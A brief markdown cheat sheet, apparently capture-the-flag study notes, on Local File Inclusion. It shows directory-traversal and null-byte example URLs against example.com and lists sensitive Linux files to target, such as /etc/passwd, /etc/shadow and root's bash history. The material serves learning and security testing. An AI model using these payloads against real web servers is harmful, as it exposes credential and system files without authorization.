# Local File Inclusion (LFI) 

## What is it
Attacker uses LFI to trick web application into exposing or running files on the web server. **Generally occurs when the application uses a path to a file as input.**
```python
open(file, <user_input_path>)
```
Can lead to - information disclosure, RCI, XSS attacks

## Exploits
1. Directory Traversal to access important files. (Doablein python, ruby, asp.net)
```
http://example.com/?file=../../../../etc/passwd and so on
```

Try directory traversal for all params possible
```
Original: 1.php?uid=abcd&rec=2
Paylod:   1.php?uid=abcd/..&rec=3.php%00
```

List of important Linux files:
```
– /etc/issue
– /proc/version
– /etc/profile
– /etc/passwd
– /etc/passwd
– /etc/shadow
– /root/.bash_history
– /var/log/dmessage
– /var/mail/root
– /var/spool/cron/crontabs/root

- wp-admin
- index.html
- index.php
```
and...`/flag` ofc :')

2. Null Byte Attack
Many developers add up a ‘.php’ extension into their codes at the end of the required variable before it gets included.

Therefore the webserver is interpreting `/etc/passwd` as `/etc/passwd.php`, thus we are not able to access the file. In order to get rid of this .php we try to terminate the variable using the null byte character (%00) 
```
http://example.com/?file=/etc/passwd%00
```

## References
https://www.hackingarticles.in/comprehensive-guide-to-local-file-inclusion/


